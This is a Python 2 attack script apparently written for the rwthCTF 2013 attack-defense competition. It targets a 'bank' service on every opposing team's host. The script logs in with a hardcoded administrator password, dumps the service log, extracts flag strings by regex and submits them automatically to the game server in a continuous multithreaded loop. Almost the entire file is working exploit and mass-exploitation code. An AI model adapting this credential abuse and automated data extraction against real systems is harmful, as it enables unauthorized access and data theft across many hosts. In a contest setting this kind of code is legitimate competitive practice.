#!/usr/bin/env python2
# -*- coding: utf-8 -*- 
# beware, ugly CTF code ahead...
# rwthCTF 2013 smartgrid script by {someone,takeshix}@hackademics.eu

import socket,re,thread,requests
from time import strftime,sleep

DEBUG = False
GAMESERVER_HOST = '10.23.0.1'
GAMESERVER_SUBMIT_PORT = 1
GAMESERVER_SCORE_PORT = 80
GAME_SERVER_JSON = '/json/up'
SOCKET_TIMEOUT = 3

OWNTEAM_ID = 1 
SERVICE_PORT = 3270
SERVICE_IP_VERSION = 4 
SERVICE_NAME = 'bank' 

class mylogs:
    def timestamp(self):
        return strftime('%H:%M:%S')

    def warning(self,msg):
        print '\033[1;31m[WARNING] [%s] [%s] %s\033[0m' % (SERVICE_NAME,self.timestamp(),str(msg))

    def debug(self,msg):
        print '\033[1;37m[DEBUG] [%s] %s\033[0m' % (self.timestamp(),str(msg))

    def info(self,msg): 
        print '\033[1;32m[INFO] [%s] [%s] %s\033[0m' % (SERVICE_NAME,self.timestamp(),str(msg))

    def flag(self,msg): 
        print '\033[1;34m[FLAG] [%s] %s\033[0m' % (self.timestamp(),str(msg))

# global log instance
log = mylogs()

def getSocket(host):
    try:
        if SERVICE_IP_VERSION == 4:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(SOCKET_TIMEOUT)
            s.connect((host,SERVICE_PORT))
        elif SERVICE_IP_VERSION == 6:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s.settimeout(SOCKET_TIMEOUT)
            s.connect((host,SERVICE_PORT,0,0))
        else:
            raise Exception('no valid ip version specified!')

        return s
    except Exception as e:
        log.warning('setting up socket failed! [EXCEPTION: %s]' % str(e))
        return False

def grabAvaiableHosts():
    teams = []
    try:
        r = requests.get("http://"+GAMESERVER_HOST+GAME_SERVER_JSON)
        teams = r.content.split("\n")[1][6:].split(",")
        return teams
    except:
        return False
    
def submit(flag):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(SOCKET_TIMEOUT)
        s.connect((GAMESERVER_HOST, GAMESERVER_SUBMIT_PORT))

        greet = s.recv(1024)
        s.send(flag.strip() + "\n")
        resp = s.recv(1024)
        s.close()
            
        if 'expired' in resp:
            if DEBUG: log.debug('flag expired.')
            return False

        if 'corresponding' in resp:
            if DEBUG: log.debug('service not up.')
            return False

        if 'already' in resp:
            if DEBUG: log.debug('already submitted')
            return False

        if 'scored' in resp:
            log.info('scored! [FLAG: %s]' % flag)

        return True
    except Exception as e:
        log.warning('flag submit failed! [EXCEPTION: %s]' % str(e))
        return False

def recv_end(the_socket,End='> '):
    total_data=[];data=''
    while True:
            data=the_socket.recv(8192)
            if End in data:
                total_data.append(data[:data.find(End)])
                break
            total_data.append(data)
            if len(total_data)>1:
                #check if end_of_data was split
                last_pair=total_data[-2]+total_data[-1]
                if End in last_pair:
                    total_data[-2]=last_pair[:last_pair.find(End)]
                    total_data.pop()
                    break
    return ''.join(total_data)

def exploit(team_ip):
    try:
        if DEBUG: log.debug("TEAM IP: "+team_ip)
        regex = re.compile(r"\w{16}")
        flags = []
        s = getSocket(team_ip) 
        recv_end(s)
        s.send("LOGIN Admin qwertys\n")
        recv_end(s)
        s.send("LOG 1\n")
        out = recv_end(s,"===  END OF LOG  ===")
    
        flags = regex.findall(out)
        return flags
    except:
        if DEBUG: log.debug("EXPLOIT EXCEPTION, LULZ!")

def run(team_ip):
    flags = exploit(team_ip)

    if not flags:
        if DEBUG: log.debug('no flag returned, continue...')
        return False

    for flag in flags:
        submit(flag)


if __name__ == '__main__':
    log.debug('starting...')
    main_count = 1

    while True:
        log.info('starting %d. run.' % main_count)
        main_count += 1
        sleep(.5)
        teams = grabAvaiableHosts()
        if not teams:
            continue

        try:
            for team_ip in teams:
                sleep(.3)
                t = thread.start_new_thread(run, ('10.22.'+team_ip+'.1',))
            sleep(2)
        except Exception as e:
            log.warning('main loop exception! [EXCEPTION: %s]' % str(e))
            continue

